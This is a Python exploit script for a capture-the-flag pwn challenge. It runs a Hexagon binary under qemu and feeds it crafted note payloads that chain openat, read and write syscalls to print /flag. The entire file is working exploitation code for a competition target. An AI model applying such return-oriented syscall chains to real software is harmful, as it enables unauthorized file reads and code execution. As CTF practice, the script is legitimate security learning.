#!/usr/bin/env python3
"""
Exploit final: openat → read → write chain with consistent layout.
"""
import struct, subprocess, os

os.chdir('/data/project/ctf-repo/pwn/nepctf2026/different_rop')

SYS_OPENAT = 56
SYS_READ   = 63
SYS_WRITE  = 64
AT_FDCWD = 0xFFFFFF9C
BSS_BUF  = 0x4bd88
TRAP0    = 0x2ba08
RESTART  = 0x21168

def build_note(base, sysno, r0, r1, r2, r3=0, r4=0, r5=0, flag_str=None):
    """
    Build a 64-byte note for note buffer at `base`.

    Layout with R30_first = base + 56 (address of note[56]):
    - Args at notes[4..28] ([R30-0x34..R30-0x1C])
    - note[48] = R30_first = base + 56
    - note[52] = TRAP0
    - note[56] = R30_after (for dealloc_return after trap0)
    - note[60] = RESTART

    After 1st dealloc_return (0x215f8): R29 = base+56, R31 = TRAP0
    Trap0 uses R30=base+56 → reads args from notes[4..28]
    After trap0, dealloc_return (0x2ba40):
      [R29] = [base+56] = note[56] → R30_after
      [R29+4] = [base+60] = note[60] → RESTART
      R29 = R30_after, jumpr RESTART
    """
    note = bytearray(64)

    # Syscall args at notes[4..28]
    struct.pack_into('<I', note, 4, r5)      # [R30-0x34] R5
    struct.pack_into('<I', note, 8, r4)      # [R30-0x30] R4
    struct.pack_into('<I', note, 12, r3)     # [R30-0x2C] R3
    struct.pack_into('<I', note, 16, r2)     # [R30-0x28] R2
    struct.pack_into('<I', note, 20, r1)     # [R30-0x24] R1
    struct.pack_into('<I', note, 24, r0)     # [R30-0x20] R0
    struct.pack_into('<I', note, 28, sysno)   # [R30-0x1C] R6

    if flag_str:
        note[32:32+len(flag_str)] = flag_str

    # Chain
    struct.pack_into('<I', note, 48, base + 56)  # R30_first
    struct.pack_into('<I', note, 52, TRAP0)       # R31_first
    struct.pack_into('<I', note, 56, base + 56)   # R30_after (same, for consistency)
    struct.pack_into('<I', note, 60, RESTART)      # R31_after
    return note

# Note bases for each stage (shifts -0x80 each restart)
b1, b2, b3 = 0x4080e4c0, 0x4080e440, 0x4080e3c0

# Stage 1: openat(AT_FDCWD, flag_at_note32, O_RDONLY)
note1 = build_note(b1, SYS_OPENAT, AT_FDCWD, b1 + 32, 0, flag_str=b'/flag\x00')

# Stage 2: read(3, BSS_BUF, 0x100)
note2 = build_note(b2, SYS_READ, 3, BSS_BUF, 0x100)

# Stage 3: write(1, BSS_BUF, 0x100)
note3 = build_note(b3, SYS_WRITE, 1, BSS_BUF, 0x100)

input_data = b'3\n' + bytes(note1) + b'\n' + b'3\n' + bytes(note2) + b'\n' + b'3\n' + bytes(note3) + b'\n' + b'5\n'

p = subprocess.run(['./qemu-hexagon', '-strace', './pwn'], input=input_data,
                   capture_output=True, timeout=30)

stdout = p.stdout.decode(errors='replace')
stderr = p.stderr.decode(errors='replace')

print(f"STDOUT: {len(stdout)}B  STDERR: {len(stderr)}B\n")
print("=== Syscalls ===")
for line in stderr.split('\n'):
    s = line.strip()
    if any(kw in s for kw in ['openat', 'read(', 'write(', 'SIG', 'exit', 'flag']):
        print(s)

print("\n=== Output tail ===")
print(stdout[-600:])

# Search for flag pattern
for line in stdout.split('\n'):
    if 'flag' in line.lower() or '{' in line or '}' in line:
        print(f"\n>>> FLAG LINE: {line.strip()}")
